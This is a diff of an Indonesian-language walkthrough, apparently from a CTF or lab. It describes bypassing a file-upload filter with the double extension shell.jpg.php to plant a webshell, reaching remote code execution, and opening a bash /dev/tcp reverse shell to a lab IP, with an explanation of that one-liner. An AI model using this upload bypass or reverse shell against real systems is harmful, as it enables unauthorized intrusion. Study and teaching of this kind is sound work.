@@ -48,7 +48,9 @@ Berikut adalah list common uploads directory
 - /media
 - /resources
 
-File yang diupload berada pada directori /uploads, selanjutnya adalah mempersiapkan shell/backdoor web pada direktori tersebut.
+File yang di upload berada pada direktori /uploads.
+
+Selanjutnya adalah mempersiapkan shell/backdoor web untuk di upload pada direktori tersebut.
 
 Disini saya menggunakan webshell yang merupakaan bawaan dari Kali Linux.
 
@@ -66,7 +68,7 @@ Magicbytes digunakan untuk mengelabui/membypass uploader, meyakinkan bahwa yang 
 
 ![2b1f5c137288962d3e193c0bce5093cc.png](./_resources/0aac928f2ead427d9cb1805986af8448.png)
 
-Namun hal tersebut tidak berhasil. Ternyata ketika dibalik menjadi shell.jpg.php, webshell berhasil di upload.
+Namun hal tersebut tidak berhasil. Tetapi ketika dibalik menjadi shell.jpg.php, webshell berhasil di upload.
 
 ![759dccab6add96541caf6777c2e0ce7a.png](./_resources/f4b4e9df972a42648980fde77011e691.png)
 
@@ -74,15 +76,15 @@ Sekarang Remote Code Execution (RCE) dapat dilakukan
 
 ![8a1272d07209ebe2ffba128811fb2302.png](./_resources/c93d20e6d336472db6aa54a7534f2a09.png)
 
-Berikutnya adalah mendapatkan reverse shell.
+Dengan adanya RCE, kita bisa mendapatkan reverse shell untuk masuk ke dalam system.
 
 ```
 bash -i >& /dev/tcp/10.9.30.115/9000 0>&1
 ```
-Sedikit penjelasan
+ Sedikit penjelasan :
 - bash -i >& /dev/tcp/10.9.30.115/9000   
-" Bash, berikan interactive shell melalui TCP, pada 10.9.30.115 di port 9000 "
-- 0>&1
+" Berikan interactive shell dari bash melalui TCP ke 10.9.30.115 di port 9000 "
+- 0>&1  
 " Redirect stdin (input) ke stdout (ouput) ", maksudnya setiap perintah yang diketik dalam reverse shell tersebut, maka akan di ditampilkan kembali ke terminal
 
 Contoh gambar  
